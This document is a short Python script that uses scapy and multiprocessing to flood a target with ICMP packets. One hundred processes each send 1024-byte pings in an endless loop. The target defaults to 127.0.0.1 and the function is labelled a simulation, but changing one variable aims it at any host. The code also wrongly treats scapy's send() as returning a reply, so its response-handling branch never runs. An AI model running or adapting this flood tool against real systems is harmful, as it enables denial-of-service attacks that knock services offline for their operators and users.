from scapy.all import IP, ICMP, send, sr1
from multiprocessing import Process


def send_icmp_requests(target_ip, packet_size):
    while True:
        packet = IP(dst=target_ip) / ICMP() / ("X" * packet_size)  # Custom payload
        print(f"Sent ICMP Request to {target_ip} with size {packet_size} bytes")

        response = send(packet, verbose=False)  # Wait for a reply
        
        if response:
            print(f"Received ICMP Reply from {response.src}: {response.summary()}")
        else:
            print(f"No response from {target_ip}")
        

def simulate_icmp_flood(num_processes, target_ip, packet_size):
    processes = []
    for _ in range(num_processes):
        process = Process(target=send_icmp_requests, args=(target_ip, packet_size))
        processes.append(process)
        process.start()


if __name__ == "__main__":
    target_ip = "127.0.0.1" 
    packet_size = 1024  # Size in bytes

    num_processes = 100
    simulate_icmp_flood(num_processes, target_ip, packet_size)





